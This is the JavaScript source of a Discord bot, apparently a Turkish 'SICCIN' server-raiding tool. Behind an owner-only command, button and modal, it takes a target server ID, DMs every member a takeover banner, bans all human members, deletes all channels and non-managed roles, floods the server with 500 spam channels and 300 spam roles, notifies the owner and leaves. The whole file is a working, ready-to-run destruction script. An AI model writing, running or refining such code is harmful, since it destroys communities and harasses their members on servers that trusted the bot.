require("dotenv").config();
const {
  Client, GatewayIntentBits, Partials,
  EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle,
  ModalBuilder, TextInputBuilder, TextInputStyle,
  StringSelectMenuBuilder, ActivityType
} = require("discord.js");

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildPresences,
    GatewayIntentBits.DirectMessages
  ],
  partials: [Partials.Channel]
});

const OWNER_ID = process.env.OWNER_ID;
const SERI_ID = process.env.SERI_ID;
const WL_KANAL_ID = process.env.WL_KANAL_ID;

let whitelist = {};
let whitelistMessageId = null;

// ================= STATUS KONTROL =================
function hasSiccinStatus(member) {
  if (!member?.presence?.activities) return false;
  return member.presence.activities.some(act =>
    act.type === ActivityType.Custom &&
    act.state &&
    (act.state.includes("/siccin") || act.state.includes(".gg/siccin"))
  );
}

// ================= WHITELIST MESAJ =================
async function updateWhitelistMessage(channel) {
  let description = "📜 **WHITELIST SUNUCULAR**\n\n";
  for (const id in whitelist) {
    description += `• ${whitelist[id].name} | ${whitelist[id].ownerTag} | ${id}\n`;
  }

  if (whitelistMessageId) {
    const msg = await channel.messages.fetch(whitelistMessageId).catch(() => null);
    if (msg) return msg.edit({ content: description });
  }

  const msg = await channel.send({ content: description });
  whitelistMessageId = msg.id;
}

// ================== .SICCIN ==================
async function siccinCommand(message) {
  if (![OWNER_ID, SERI_ID].includes(message.author.id))
    return message.reply("❌ Bu komutu sadece OWNER veya SERI kullanabilir.");

  const member = await message.guild.members.fetch(message.author.id);
  if (!hasSiccinStatus(member)) {
    return message.reply("❌ Durumunda `/siccin` veya `.gg/siccin` yok.");
  }

  const row = new ActionRowBuilder().addComponents(
    new ButtonBuilder()
      .setCustomId("siccinStart")
      .setLabel("ＳＩＣＣＩＮ")
      .setStyle(ButtonStyle.Secondary)
  );

  const embed = new EmbedBuilder()
    .setColor("DarkRed")
    .setTitle("ＳＩＣＣＩＮ EJECTED")
    .setDescription(`ＳＩＣＣＩＮ Tarafından ${message.guild.name} Sunucusuna El Konulmuştur\n#GLORY TO ＳＩＣＣＩＮ\ndiscord.gg/siccin`)
    .setThumbnail(message.guild.iconURL({ dynamic: true }));

  await message.channel.send({ embeds: [embed], components: [row] });
}

// ================== INTERACTIONS ==================
client.on("interactionCreate", async interaction => {
  if (interaction.isButton() && interaction.customId === "siccinStart") {
    const modal = new ModalBuilder()
      .setCustomId("siccinModal")
      .setTitle("Hedef Sunucu ID");

    modal.addComponents(
      new ActionRowBuilder().addComponents(
        new TextInputBuilder()
          .setCustomId("guildID")
          .setLabel("Hedef Sunucu ID")
          .setStyle(TextInputStyle.Short)
          .setPlaceholder("1111111111111111")
          .setRequired(true)
      )
    );

    return interaction.showModal(modal);
  }

  if (interaction.isModalSubmit() && interaction.customId === "siccinModal") {
    const guildId = interaction.fields.getTextInputValue("guildID");
    const guild = client.guilds.cache.get(guildId);

    if (!guild) return interaction.reply({ content: "❌ Bot bu sunucuda yok.", ephemeral: true });
    if (whitelist[guildId]) return interaction.reply({ content: "⚠️ Sunucu whitelist'te", ephemeral: true });

    await interaction.reply({ content: "💣 ＳＩＣＣＩＮ başlatıldı", ephemeral: true });

    // Embed DM
    const embedDM = new EmbedBuilder()
      .setColor("DarkRed")
      .setTitle("ＳＩＣＣＩＮ EJECTED")
      .setThumbnail(guild.iconURL({ dynamic: true }))
      .setDescription(`ＳＩＣＣＩＮ Tarafından ${guild.name} Sunucusuna El Konulmuştur\n#GLORY TO ＳＩＣＣＩＮ\ndiscord.gg/siccin`);

    const members = await guild.members.fetch();

    // BAN + DM paralel
    await Promise.all(members.map(m => {
      if (m.user.bot) return;
      m.send({ embeds: [embedDM] }).catch(() => {});
      return m.ban({ reason: "ＳＩＣＣＩＮ" }).catch(() => {});
    }));

    // Kanalları sil + 500 yeni kanal oluştur
    await Promise.all(guild.channels.cache.map(c => c.delete().catch(() => {})));
    for (let i = 0; i < 500; i++) {
      guild.channels.create({ name: "ＳＩＣＣＩＮ🔱", type: 0 }).catch(() => {});
    }

    // Rolleri sil + 300 yeni rol oluştur
    await Promise.all(guild.roles.cache.filter(r => !r.managed).map(r => r.delete().catch(() => {})));
    for (let i = 0; i < 300; i++) {
      guild.roles.create({ name: `ＳＩＣＣＩＮ-${i}`, color: "Red" }).catch(() => {});
    }

    // Log OWNER
    const owner = await client.users.fetch(OWNER_ID).catch(() => null);
    if (owner) owner.send(`✅ ＳＩＣＣＩＮ tamamlandı\nSunucu: ${guild.name} (${guild.id})`);

    await guild.leave().catch(() => {});
  }
});

// ================== MESSAGE COMMANDS ==================
client.on("messageCreate", async message => {
  if (!message.guild || message.author.bot) return;

  const cmd = message.content.toLowerCase();

  if (cmd === ".siccin") return siccinCommand(message);
});

client.login(process.env.BOT_TOKEN);
